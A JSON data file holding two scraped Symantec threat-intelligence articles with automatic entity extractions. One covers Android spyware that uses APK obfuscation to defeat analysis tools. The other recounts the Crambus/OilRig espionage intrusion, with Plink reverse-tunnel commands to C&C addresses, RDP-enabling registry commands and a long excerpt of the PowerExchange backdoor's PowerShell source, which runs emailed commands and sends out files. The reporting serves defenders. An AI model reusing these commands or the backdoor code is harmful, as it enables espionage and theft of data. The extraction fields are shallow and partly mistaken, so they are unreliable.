[
  {
    "title": "spyware obfuscation static analysis",
    "link": "https://www.security.com/threat-intelligence/spyware-obfuscation-static-analysis",
    "content": "With the surging popularity of mobile applications, the landscape of cybersecurity is encountering increasingly intricate and discreet forms of malicious software. One common strategy in the realm of cybersecurity is code obfuscation. This practice involves the deliberate alteration of various elements within the code, such as variables, functions, and class names, rendering them virtually indecipherable. This not only poses a formidable challenge for anyone attempting to discern their purpose from their names but also significantly amplifies the complexity involved in decompilation. Recently, our attention was caught by a Spyware cluster, which has employed a series of ingenious techniques to heighten the difficulties associated with static analysis. These methods, which we will discuss below, draw inspiration from diverse sources, some originating from resilient services and others from various \"tools\" at the disposal of these unscrupulous actors. The world of mobile application security is rife with inventive techniques for concealing essential resources within APK files, the containers that hold Android applications. One such strategy involves creating directories within the APK that share the same names and permissions as vital resources. Figure 1 provides a visual representation of this approach. This technique presents complications for various analysis tools. For instance, Jadx, a popular decompiler for Android applications, can encounter problems when attempting to extract the AndroidManifest.xml file from these disguised directories. Figure 2 shows the wrong extraction in Jadx. Another sneaky method involves hiding critical resources within an APK using an unsupported compression method for the local file header, while employing the correct compression method in the central directory file header. Figure 3 is the snapshot of deceptive compression code. This deceptive      maneuver also leads to issues with certain tools, including third-party libraries, causing them to malfunction. Figure 4 shows the error messages printed from the tools. Nonetheless, Android can manage this effectively because it can retrieve the “correct” compression method from the central directory file header. Exploring further within these covert techniques, we encounter the intriguing utilization of \"no compression\" data. Android currently supports both the no compression mode and the standard deflate compression mode (as shown in Figure 6). Traditionally, in Android's mapping, the no compression entry is represented as zero and begins with “00 00” (as seen in Figure 7). However, what piqued our interest is the presence of obfuscated entry codes within this spyware cluster (as displayed in Figures 8 and 9). Despite these unique entry codes, these spyware variants can still be installed on Android devices. Android's support for both the no compression and standard deflate compression methods is pivotal in managing these scenarios. For higher Android versions that employ APK signature schemes V2 and V3, the system adeptly handles \"no compression\" even when faced with unsupported compression entry codes in both file headers. This seamless handling ensures the smooth installation of APKs, despite the presence of obfuscated entry codes (as evident in Figure 10). Then this group of spywares makes use of the design, and specifies them to support APK signature schemes V2 and V3 only (Figure 11, 12). We can see the V2 and V3 signatures schemes as well as the APK signature block number for V2+ (Figure 13). By doing so, these spywares effectively shield themselves from static analysis by various commonly used tools. For example, Apktool may falter in decoding due to the usage of a non-standard compression method (Figure 14). Zipping libraries like Unzip and 7z may struggle to extract files, as they strictly adhere to the legal ZIP format (Figure 15). Jadx may also face challenges when dealing with files manipulated in this manner (Figure 16). “Obfuscated” AndroidManifest.xml and resources.arsc files can disrupt reverse engineering tools. With invalid attributes and illegal resource IDs, for example, the Android system doesn't parse illegal resource ID numbers, so while adding such a redundant attribute may not affect the APK's regular functionality, it can still cause issues with reverse engineering tools like Apktool, Jadx, JEB, etc. (Figure 17). The spyware cluster, along with its variants, goes to great lengths to conceal its true identity by masquerading as well-known games, popular apps, and even system-level applications. Among the list of decoys are prominent names like Play Store, Google TV, Google Meet, Google Translate, Chrome, YouTube, Netflix, TikTok, Discord, Spotify, Angry Birds, Facebook Lite, Instagram, , Disney+, Snapchat, and Android Settings. To further enhance their deception, they engage in app repackaging, essentially dressing themselves up as these widely recognized apps to appear even more convincing to unsuspecting users. When an unsuspecting user installs and opens one of these misleading applications, it will persistently seek accessibility permissions (as depicted in Figure 19). While this may appear innocuous, it is merely the beginning of a more complex operation. Through interactions with the user interface, these apps discreetly secure sensitive permissions and disable power optimization, as demonstrated in GIF 1. Although the default servers are not valid so far. To gather additional data and simulate the responses necessary to trigger malicious behaviors, we set up a mock server. The deceptive apps send fundamental app data, system information, and configuration details to this server and await further instructions (Figure 21). Moreover, once granted accessibility access, these apps can monitor and report a user's application activities to a designated server (Figure 22). All this activity is transmitted to the server after being encrypted (Figure 23). Let's delve into the intricacies of the C&C sections. These sections intentionally introduce noise, including junk code and irrelevant strings, into essential methods such as communication and command parsing (Figure 24). Their aim is to disrupt the functioning of static analysis tools like Jadx. By stripping away this noise, we can discern that the server's response adheres to a specific format (Figure 25). The length components have variable lengths and end with '0', while the data content incorporates commands with GZIP compression. The command handler AsyncTask is awaiting valid commands to be delivered from the server after launching the application (Figure 26). Once we remove the noise from the command parser code, it becomes evident that it possesses substantial capabilities. We listed a few of them in Table 1. To verify our findings, we employed a toast alert and sendSMS command for testing purposes. The commands delivered by our mock server were executed successfully (Figure 27). The spywares also have anti-killing/uninstalling methods to protect themselves. When the app detects that the user is trying to kill or uninstall itself through accessibility, it triggers the 'HOME' or 'BACK' action (Figure 28). In the realm of mobile application security, we've explored a range of deceptive tactics, including resource camouflage, compression trickery, signature scheme evasion, and resource obfuscation. These techniques pose challenges for users and defenders, making it crucial for security experts to understand these tactics to counter evolving threats effectively. Users who have installedBroadcom SEP Mobilewill be shielded from this particular set of spyware threats. For the latest protection updates, please visit theSymantec Protection Bulletin. Symantec recommends users follow these best practices to stay protected from mobile threats: Tommy is a member of Symantec's Security Technology and Response team who are focused on researching and providing protection against current and future cyber threats. Yuanjing is a member of Symantec's Security Technology and Response team who are focused on researching and developing automation technologies in mobile security. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Spyware, Malware), (code obfuscation, Technique), (Jadx, Tool), (Android applications, File)\nRelationships: (Spyware, employs, code obfuscation), (Spyware, uses, Jadx)",
      "entities": [
        [
          "Spyware",
          "Malware"
        ],
        [
          "code obfuscation",
          "Technique"
        ],
        [
          "Jadx",
          "Tool"
        ],
        [
          "Android applications",
          "File"
        ]
      ],
      "relationships": [
        [
          "Spyware",
          "employs",
          "code obfuscation"
        ],
        [
          "Spyware",
          "uses",
          "Jadx"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 4,
    "relationship_count": 2
  },
  {
    "title": "crambus middle east government",
    "link": "https://www.security.com/threat-intelligence/crambus-middle-east-government",
    "content": "The Iranian Crambus espionage group (aka OilRig, APT34) staged an eight-month-long intrusion against a government in the Middle East between February and September 2023. During the compromise, the attackers stole files and passwords and, in one case, installed a PowerShell backdoor (dubbed PowerExchange) that was used to monitor incoming mails sent from an Exchange Server in order to execute commands sent by the attackers in the form of emails, and surreptitiously forwarded results  to the attackers. Malicious activity occurred on at least 12 computers and there is evidence that the attackers deployed backdoors and keyloggers on dozens more. In addition to deploying malware, the attackers made frequent use of the publicly available network administration tool Plink to configure port-forwarding rules on compromised machines, enabling remote access via the Remote Desktop Protocol (RDP). There is also evidence the attackers modified Windows firewall rules in order to enable remote access. Crambus is a long-running Iranian espionage group that has mounted operations against targets in multiple countries, including Saudi Arabia, Israel, the United Arab Emirates, Iraq, Jordan, Lebanon, Kuwait, Qatar, Albania, the U.S., and Turkey. The group is known to stage long-running intrusions for intelligence gathering and spying purposes. In recent years it has added a heavy social engineering component to the early stages of its attacks. It most recently came to attention last year, whenMicrosoft linked the groupto a destructive attack against the Albanian government. It assessed that Crambus was involved in gaining initial access and exfiltrating data from impacted networks. Wipers were likely then deployed by other Iran-linked actors. During this latest attack, Crambus deployed three previously undiscovered pieces of malware, along with the PowerExchange backdoor, a known backdoor that hadn’t yet been attributed to Crambus. In addition to malware, the attackers made use of a number of living-off-the-land and legitimate tools. The first evidence of malicious activity on the target’s network occurred on February 1, 2023, when an unknown PowerShell script (file name: joper.ps1) was executed from a suspicious directory: CSIDL_PROFILE\\public\\sat. The same script was executed multiple times on the same computer (Computer 1) over the next seven days. Four days later, on February 5, the attackers accessed a second computer (Computer 2) and a renamed version of Plink (msssh.exe), a command-line connection tool for the PuTTY SSH client, was used to configure port-forwarding rules allowing for RDP access from a remote host: CSIDL_PROFILE\\public\\sat\\msssh.exe 151.236.19[.]91 -P [REMOVED]-C -N -R 0.0.0.0:54231:127.0.0.1:3389 -l [REMOVED] -pw [REMOVED] This masqueraded Plink (mssh.exe) was executed repeatedly on this computer up until February 12. On February 21, malicious activity commenced on a web server (Web Server 1) when a netstat command was executed to retrieve a full list of all TCP and UDP connections. The netstat command line switches perform the following actions: Next, Plink (mssh.exe) was launched again to enable remote RDP access. After this occurred, there was evidence that a PowerShell script was used to mount the C: drive of another computer on the network. On April 8, the attackers gained access to a third computer (Computer 3), where another variant of Plink was executed from the %USERPROFILE%\\public directory and was used to forward port 3389 to port 999 on all available interfaces: CSIDL_PROFILE\\public\\plink.exe [REMOVED] -pw [REMOVED] -P [REMOVED] -2 -4 -T -N -C -R 0.0.0.0:999:127.0.0.1:3389 The options supplied in the command perform the following actions: At the same time, an unknown batch file was executed, which redirected output to a text file in the %USERPROFILE%\\public directory. cmd /c CSIDL_PROFILE\\public\\p2.bat > CSIDL_PROFILE\\public\\001.txt 2>&1 Immediately afterwards, the same Plink command was run a second time. This is followed by the same unknown batch script being executed several more times. Later that day, Mimikatz was executed from the %TEMP% directory to dump credentials. On April 9, another netstat command was run on a new compromised computer, the Domain Controller (Computer 4): The “o” option adds the process ID (PID) of the associated process that's using each network connection or listening port. The command will provide a list of all active network connections, both incoming and outgoing, along with the associated PID of the processes using those connections. Three hours later, Mimikatz was run again to dump credentials. The next day, April 10, an unknown windows batch file (file name: p.bat) was executed on Computer 3. This was followed by a Plink command: plink.exe ssh 78.47.218[.]106 1234qweRRR 443 10999 10.75.45.222 3389 The options perform the following actions: The command is used to set up a port forwarding tunnel from the compromised machine as a means to access the remote server’s RDP service as if it was running locally. On April 23, activity resumed on Computer 3, when previously unseen malware named Backdoor.Tokel (file name: telecomm.exe) was executed. On May 7, a suspicious PowerShell command was executed on the Domain Controller (Computer 4) to run an unknown script (file name: hwf.ps1). Malicious activity appeared to cease for nearly a month until June 4, when Backdoor.Tokel was executed again on Computer 3. On June 17, a suspicious PowerShell command was executed on the Domain Controller (Computer 4) in order to run another unknown script (file name: zone.ps1). On June 20, Backdoor.PowerExchange (file name: setapp.ps1) was run on Computer 3. The PowerShell-based backdoor is designed to execute commands received from the attackers. This is done by logging into compromised mailboxes on an Exchange Server and monitoring for incoming emails from the attackers. Email’s that contain “@@” in the subject line are read by Backdoor.PowerExchange and have the ability to execute commands received from the attackers, effectively using the Exchange Server as a C&C. The script allows four commands to execute: The attackers likely installed the script on an ordinary computer on the network in order to avoid raising suspicions created by anomalous network traffic, since internal connections to an Exchange Server are expected behavior. On July 1, the attackers once again utilized the masqueraded version of Plink to open a tunnel on Computer 3 by redirecting RDP to Port 12345 on any listening interface, effectively allowing external connections over RDP to the compromised machine. The next day, July 2, the attackers used netstat to list all open and listening TCP and UDP ports. It's possible the attackers were checking that the SSH tunnel was still active. On July 8, the attackers used the Domain Controller (Computer 4) to create a service on a remote host (10.75.45[.]222) to run an unknown script (file name: pl.bat). The service was configured to auto-start during the boot up process. Over the next two days, July 9 and 10, another new piece of malware named Trojan.Dirps (file name: virtpackage.exe) was repeatedly executed on Computer 3. On July 11, the attackers introduced more malicious tools to Computer 3, installing a third new piece of malware named Infostealer.Clipog (file name (poluniq.exe) which is used to capture keystrokes and steal clipboard contents. The next day (July 12) the attackers ran Mimikatz on the Domain Controller (Computer 4) to dump credentials. On July 15, the attackers again ran the unknown PowerShell script (zone.ps1) on the Domain Controller (Computer 4), followed by a second unknown script (copy.ps1). On July 18, the attackers again executed Infostealer.Clipog on Computer 3 before creating an SSH tunnel using Plink to access RDP services. This SSH tunnel was created again on August 3. On August 6, yet another unknown PowerShell script (file name: tnc.ps1) was executed on the Domain Controller (Computer 4). Immediately afterwards, Nessus vulnerability scans were observed, specially hunting for Log4j vulnerabilities on other machines on the network. While this could have been legitimate vulnerability scanning activity, not long afterwards netsh was executed to list all firewall rules. CSIDL_SYSTEM\\netsh.exe advfirewall firewall show rule name=[REMOVED] verbose Following this, another PowerShell script was executed. The script appeared to be designed to query and collect information about local user groups and their members on a Windows system. Its output was information about SIDs, names, object classes, and principal sources of local user groups and their members in a structured format. CSIDL_SYSTEM\\windowspowershell\\v1.0\\powershell -NoProfile -Command ;& {$j = sajb {$ErrorActionPreference = 'SilentlyContinue';$groups = Get-LocalGroup | Select-Object Name, Domain, SID;foreach($g in $groups){-join($g.SID,'|',$g.Name);$members = Get-LocalGroupMember -SID $g.SID | Select *;foreach($m in $members){-join(' ',$m.SID,'|',$m.Name,'|',$m.ObjectClass,'|',$m.PrincipalSource);}}};$r = wjb $j -Timeout 300; rcjb $j;}; After this, net.exe was used to list all mapped drives, before WMI (Windows Management Instrumentation) was used to execute Plink in order to open port-forwarding on the compromised host, allowing for remote RDP access. On August 7 and again on August 12, Plink was downloaded from the internet on to the Domain Controller (Computer 4) and saved as \\ProgramData\\Adobe.exe. On August 30, the attackers obtained access to a second web server (Web Server 2). They first used Plink to enable access to RDP on Port 12345 from their C&C server (91.132.92[.]90). They then installed Infostealer.Clipog using a different file name (fs-tool.exe). The next day, August 31, the attackers established a tunnel once again to open RDP access on Port 4455 from their C&C. Output was redirected to a text file (file name: 001.txt). There may have been some issues connecting as the attackers later attempted to create the same tunnel, this time using Port 12345. On September 1, the attackers shifted their attention to three more computers (Computer 5, Computer 6 and Computer 7), using Certutil to download Plink to each machine. They then executed an unknown PowerShell script (file name: joper.ps1) on Web Server 2. On September 2, the attackers ran the following netstat command on Web Server 2: This command is used to list all active connections. The unknown PowerShell script (file name: joper.ps1) was then run again. On September 3, the attackers once again ran joper.ps1 before two suspicious Wireshark commands were executed: ;CSIDL_SYSTEM_DRIVE\\program files\\wireshark\\extcap\\usbpcapcmd.exe; --extcap-interfaces --extcap-version=4.0 ;CSIDL_SYSTEM_DRIVE\\program files\\wireshark\\dumpcap.exe; -D -Z none Wireshark’s usbcapcmd utility was used to capture USB traffic on specified USB devices and save the captured data to a file. Similarly, dumpcap was used to capture network packets. It appears the attackers were interested in identifying any available network or USB interfaces from which they could capture packets on the machine. Immediately afterwards, a suspicious netstat command ran: This will list all active connections and print them to standard output in numerical form. After joper.ps1 was once again executed, the attackers turned their attention back to Computer 3, where they ran a number of reg.exe commands: reg.exe ADD ;HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\\Control\\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f reg.exe ADD ;HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\\Control\\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f reg.exe ADD ;HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\\Control\\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f cmd.exe /c reg.exe ADD ;HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\\Control\\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f cmd.exe /c reg.exe ADD ;HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\\Control\\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f These commands were used to modify system configuration to enable Terminal Services (i.e. remote access) to the computer via RDP. A few hours later, a suspicious net.exe command was executed to mount the c$ share of another machine using stolen credentials. ;CSIDL_SYSTEM\\net.exe; use \\\\[REMOVED]\\c$ /user:[REMOVED] [REMOVED] On September 4, the attackers executed three different variants of the joper.ps1 script on Web Server 2. They then turned their attention back to Computer 1, where a new variant of the Backdoor.Tokel malware was installed on the computer. The next day, September 5 the attackers once again ran the joper.ps1 script on Web Server 2, while using net.exe to mount and unmount various network shares. They then executed Backdoor.Tokel on Computer 3 again before installing it on two more computers (Computer 9 and Computer 10). Malicious activity continued until September 9, with the attackers largely focusing their attention on Web Server 2, running the joper.ps1 script and mounting/unmounting network shares. Crambus is a long-running and experienced espionage group that has extensive expertise in carrying out long campaigns aimed at targets of interest to Iran.After a 2019 leak of its toolset, there was some speculation that Crambus may disappear. However, its activities over the past two years demonstrate that it represents a continuing threat for organizations in the Middle East and further afield. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 4d04ad9d3c3abeb61668e52a52a37a46c1a60bc8f29f12b76ff9f580caeefba8 – Backdoor.Tokel 41672b08e6e49231aedf58123a46ed7334cafaad054f2fd5b1e0c1d5519fd532 – Backdoor.Tokel 497e1c76ed43bcf334557c64e1a9213976cd7df159d695dcc19c1ca3d421b9bc – Trojan.Dirps 75878356f2e131cefb8aeb07e777fcc110475f8c92417fcade97e207a94ac372 – Infostealer.Clipog d884b3178fc97d1077a13d47aadf63081559817f499163c2dc29f6828ee08cae – Backdoor.PowerExchange a1a633c752be619d5984d02d4724d9984463aa1de0ea1375efda29cadb73355a – PowerShell script 22df38f5441dec57e7d7c2e1a38901514d3f55203b2890dc38d2942f1e4bc100 – PowerShell script 159b07668073e6cd656ad7e3822db997d5a8389a28c439757eb60ba68eaff70f – PowerShell script 6964f4c6fbfb77d50356c2ee944f7ec6848d93f05a35da6c1acb714468a30147 – PowerShell script 661c9535d9e08a3f5e8ade7c31d5017519af2101786de046a4686bf8a5a911ff – PowerShell script db1cbe1d85a112caf035fd5d4babfb59b2ca93411e864066e60a61ec8fe27368 – PowerShell script 497978a120f1118d293906524262da64b15545ee38dc0f6c10dbff3bd9c0bac2 – PowerShell script db1cbe1d85a112caf035fd5d4babfb59b2ca93411e864066e60a61ec8fe27368 – PowerShell script 6b9f60dc91fbee3aecb4a875e24af38c97d3011fb23ace6f34283a73349c4681 – PowerShell script 497978a120f1118d293906524262da64b15545ee38dc0f6c10dbff3bd9c0bac2 – PowerShell script be6d631fb2ff8abe22c5d48035534d0dede4abfd8c37b1d6cbf61b005d1959c1 – PowerShell script 22df38f5441dec57e7d7c2e1a38901514d3f55203b2890dc38d2942f1e4bc100 – PowerShell script 661c9535d9e08a3f5e8ade7c31d5017519af2101786de046a4686bf8a5a911ff – PowerShell script 159b07668073e6cd656ad7e3822db997d5a8389a28c439757eb60ba68eaff70f – PowerShell script 6bad09944b3340947d2b39640b0e04c7b697a9ce70c7e47bc2276ed825e74a2a – PowerShell script ba620b91bef388239f3078ecdcc9398318fd8465288f74b4110b2a463499ba08 – PowerShell script d0bfdb5f0de097e4460c13bc333755958fb30d4cb22e5f4475731ad1bdd579ec – PowerShell script 5a803bfe951fbde6d6b23401c4fd1267b03f09d3907ef83df6cc25373c11a11a – PowerShell script 1698f9797f059c4b30f636d16528ed3dd2b4f8290e67eb03e26181e91a3d7c3b – PowerShell script 23db83aa81de19443cafe14c9c0982c511a635a731d6df56a290701c83dae9c7 – PowerShell script 41ff7571d291c421049bfbd8d6d3c51b0a380db3b604cef294c1edfd465978d9 – PowerShell script c488127b3384322f636b2a213f6f7b5fdaa6545a27d550995dbf3f32e22424bf – PowerShell script 6964f4c6fbfb77d50356c2ee944f7ec6848d93f05a35da6c1acb714468a30147 – PowerShell script 927327bdce2f577b1ee19aa3ef72c06f7d6c2ecd5f08acc986052452a807caf2 – PowerShell script a6365e7a733cfe3fa5315d5f9624f56707525bbf559d97c66dbe821fae83c9e9 – PowerShell script c3ac52c9572f028d084f68f6877bf789204a6a0495962a12ee2402f66394a918 – PowerShell script 7e107fdd6ea33ddc75c1b75fdf7a99d66e4739b4be232ff5574bf0e116bc6c05 – PowerShell script 78.47.218[.]106 – Plink C&C 192.121.22[.].46 – Plink C&C 151.236.19[.]91 – Plink C&C 91.132.92[.]90 – Plink C&C $OutputEncoding = [console]::InputEncoding = [console]::OutputEncoding = New-Object System.Text.UTF8Encoding $dir=\"$env:PUBLIC\\MicrosoftEdge\" $directory = get-childitem -Path \"$($dir)\\*\"-Include 'config.conf' $userid = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME)) $mailList = New-Object Collections.Generic.List[String] $mailList.Add('Ahmed_Alrashed20@outlook.com') $subject = \"Update Microsoft Edge\" $body = \"Microsoft Edge Update\" $rule = \"defaultexchangerules\" $NewRule = [Microsoft.Exchange.WebServices.Data.Rule]::new() $NewRule.DisplayName = $rule $NewRule.Priority = 1 $newRule.IsEnabled = $true; $NewRule.Conditions.ContainsSubjectStrings.Add(\"@@\") $NewRule.Actions.MoveToFolder = [Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::DeletedItems $CreateRuleOperation = [Microsoft.Exchange.WebServices.Data.CreateRuleOperation]::new($NewRule) $ExchangeService.UpdateInboxRules([Microsoft.Exchange.WebServices.Data.RuleOperation[]]@($CreateRuleOperation),$true) using System.Security.Cryptography.X509Certificates; publicclassTrustAllCertsPolicy : ICertificatePolicy { publicbool CheckValidationResult( ServicePoint srvPoint, X509Certificate certificate, WebRequest request, intcertificateProblem) { [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy $dllpath = get-childitem -Path \"$($dir)\\*\"-Include 'Microsoft.Exchange.WebServices.dll' try{[void][Reflection.Assembly]::LoadFile($dllpath.FullName)}catch{$_.Exception | Out-File -FilePath \"$($dir)\\EWSERROR.txt\"-Append;exit} $global:ExchangeService = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService $ExchangeService.UserAgent = \"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko\"; $urllist = @([System.Uri][REMOVED],[System.Uri][REMOVED],[System.Uri] [REMOVED]) $userlist = @([REMOVED],[REMOVED]) foreach($item in $userlist ) $username=$item.split('||')[0] $password=$item.split('||')[2] if(-not [string]::IsNullOrEmpty($username)) $ExchangeService.Credentials = New-Object Microsoft.Exchange.WebServices.Data.WebCredentials($username,$password) foreach($url in $urllist) $ExchangeService.Url=$url $inboxfolder = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($ExchangeService,[Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox) $rules= $ExchangeService.GetInboxRules().DisplayName if(-not [string]::IsNullOrEmpty($rules)){if(-not $rules.Contains(\"defaultexchangerules\")){addrule}}else{addrule} catch{\"URL: \"+$url.Host+[Environment]::NewLine+\"User: \"+$username+[Environment]::NewLine+$_.Exception.Message | Out-File -FilePath \"$($dir)\\EWSERROR.txt\"-Append} $exchangeservice.UseDefaultCredentials=$true foreach($url in $urllist) $inboxfolder = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($ExchangeService,[Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox) $rules= $ExchangeService.GetInboxRules().DisplayName if(-not [string]::IsNullOrEmpty($rules)){if(-not $rules.Contains(\"defaultexchangerules\")){addrule}}else{addrule} if(-not [string]::IsNullOrEmpty($username)) $ExchangeService.Credentials = New-Object Microsoft.Exchange.WebServices.Data.WebCredentials($username,$password) $ExchangeService.AutodiscoverUrl($username) $inboxfolder = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($ExchangeService,[Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox) $rules= $ExchangeService.GetInboxRules().DisplayName if(-not [string]::IsNullOrEmpty($rules)){if(-not $rules.Contains(\"defaultexchangerules\")){addrule}}else{addrule} $exchangeservice.UseDefaultCredentials = $true $ExchangeService.AutodiscoverUrl($username) $inboxfolder = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($ExchangeService,[Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox) $rules= $ExchangeService.GetInboxRules().DisplayName if(-not [string]::IsNullOrEmpty($rules)){if(-not $rules.Contains(\"defaultexchangerules\")){addrule}}else{addrule} $folder = New-Object Microsoft.Exchange.WebServices.Data.FolderId([Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox) try{$inboxfolder = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($exchangeservice,$folder)}catch{} $iv = New-object Microsoft.Exchange.WebServices.Data.ItemView(10) $inboxitems= $inboxfolder.FindItems($iv) $itemIds = $inboxitems.id.UniqueId foreach($itemId in $itemIds) try{$message = [Microsoft.Exchange.WebServices.Data.Item]::Bind($ExchangeService,$itemId)}catch{} if($mailList.Contains($message.ToRecipients.Name)) $message.Delete('HardDelete') {param([string]$mail,[string]$data) $message = New-Object Microsoft.Exchange.WebServices.Data.EmailMessage($ExchangeService) $Resultb64Bytes = [System.Text.Encoding]::UTF8.GetBytes($data) $message.ToRecipients.Add($mail) $message.Subject = $subject $message.Body = $body $message.Attachments.AddFileAttachment(\"New Text Document.txt\",$Resultb64Bytes) try{$message.Send()}catch{} Start-Sleep -Seconds 15 $response = New-Object Collections.Generic.List[String] $Inbox = [Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox $DeletedItems=[Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::DeletedItems $JunkEmail=[Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::JunkEmail $folders=@($DeletedItems,$Inbox,$JunkEmail) foreach($f in $folders) $folder = New-Object Microsoft.Exchange.WebServices.Data.FolderId($f) try{$inboxfolder=[Microsoft.Exchange.WebServices.Data.Folder]::Bind($ExchangeService,$folder)}catch{} $iv = New-object Microsoft.Exchange.WebServices.Data.ItemView(10) $searchFilter = New-Object Microsoft.Exchange.WebServices.Data.SearchFilter+ContainsSubstring([Microsoft.Exchange.WebServices.Data.ItemSchema]::subject,'@@') $result = $ExchangeService.FindItems($folder,$searchFilter,$iv) if(-not [string]::IsNullOrEmpty($result)) $ItemIds = $result.id.UniqueId foreach($ItemId in $ItemIds) try{$x=[Microsoft.Exchange.WebServices.Data.Item]::Bind($ExchangeService,$ItemId)}catch{} $mailSender = $x.sender.Address $xx = $x.Subject -match \"@@(.*)@@\" try{$id=$Matches[1]}catch{} if(-not [string]::IsNullOrEmpty($id)) $response.Add(\"planA\") $response.Add($ItemId) elseif($flag -eq $false) $response.Add(\"planB\") $response.Add($mailSender) try{$message=[Microsoft.Exchange.WebServices.Data.Item]::Bind($ExchangeService,$ItemId)}catch{} $mailSender = $message.Sender.Address $message.IsRead=$true $message.Update([Microsoft.Exchange.WebServices.Data.ConflictResolutionMode]::AutoResolve) foreach($attachment in $message.Attachments) $RawData = ([System.Text.Encoding]::UTF8.GetString($attachment.Content)).substring(7) if($RawData.Length%4-ne 0) $newRawData = $RawData.PadRight(($RawData.Length+$RawData.Length%4),'=') $Data = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($newRawData)) $Data = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($RawData)) $message.Delete('HardDelete') $uuid = -join ((65..90) + (97..122) | Get-Random -Count 7| % {[char]$_}) foreach ($h in $cmd.GetEnumerator()) if(($h.value).Length%4-ne 0) $newValue = ($h.value).PadRight((($h.value).Length+($h.value).Length%4),'=') $com = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($newValue)) $com = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($h.value)) if(![string]::IsNullOrEmpty($com)) $run = iex $com | out-string $extb64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(\".txt\")) $Total += \"$($uuid)$($userid):$($h.Name):$($uuid)$([System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(\"$run\"))):$($uuid)$($extb64)\"+[System.Environment]::Newline sendMessage $mailSender $Total $uuid = -join ((65..90) + (97..122) | Get-Random -Count 7| % {[char]$_}) foreach ($h in $dl.GetEnumerator()) if(($h.value).Length%4-ne 0) $newpath = $($h.value).PadRight(($($h.value).Length+$($h.value).Length%4),'=') $path = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($newpath)).Replace('\"',\"\") $path = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($h.value)).Replace('\"',\"\") $size = (Get-Item $path).Length $DataBytes= [System.IO.File]::ReadAllBytes($path) $Datab64 = [Convert]::ToBase64String($DataBytes) $ext = [System.IO.Path]::GetExtension($path) $extb64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($ext)) $Datab64= [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(\"Size is Greater than 5 MB\")) $extb64= [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(\".txt\")) $Total += \"$($uuid)$($userid):$($h.Name):$($uuid)$($Datab64):$($uuid)$($extb64)\"+[System.Environment]::Newline sendMessage $mailSender $Total $uuid = -join ((65..90) + (97..122) | Get-Random -Count 7| % {[char]$_}) foreach ($h in $up.GetEnumerator()) $Fileb64 = ($h.value).split(':')[0] $Pathb64 = ($h.value).split(':')[1] if($Pathb64.Length%4-ne 0) $newpathb64 = $Pathb64.PadRight(($Pathb64.Length+$Pathb64.Length%4),'=') $path_save = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($newpathb64)).Replace('\"','') $path_save = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Pathb64)).Replace('\"','') if($Fileb64.Length%4-ne 0) $newFileb64 = $Fileb64.PadRight(($Fileb64.Length+$Fileb64.Length%4),'=') $Fileb64Bytes = [System.Convert]::FromBase64String($newFileb64) $Fileb64Bytes = [System.Convert]::FromBase64String($Fileb64) [System.IO.File]::WriteAllBytes($path_save,$Fileb64Bytes) $Datab64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(\"file upload\")) $extb64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(\".txt\")) $Total += \"$($uuid)$($userid):$($h.Name):$($uuid)$($Datab64):$($uuid)$($extb64)\"+[System.Environment]::Newline sendMessage $mailSender $Total $timer = [System.Diagnostics.Stopwatch]::StartNew() while(($timer.Elapsed.TotalMinutes -lt 5) -and (([string]::IsNullOrEmpty($value)))) Start-Sleep -Seconds 10 if(-not[string]::IsNullOrEmpty($value)) if($value[0] -eq \"planA\") if($value[0] -eq \"planB\") $mailList+= $value[1] sendMessage $value[1] $userid foreach ($mail in $mailList) sendMessage $mail $userid if(-not[string]::IsNullOrEmpty($value)) if($value[0] -eq \"planA\") $connect = connection if($connect -eq $true) if($directory.Name -ne 'config.conf') try{New-Item -Path \"$($dir)\"-ItemType File -Name \"config.conf\"-ErrorAction Stop;core}catch{} The Threat Hunter Team is a group of security experts 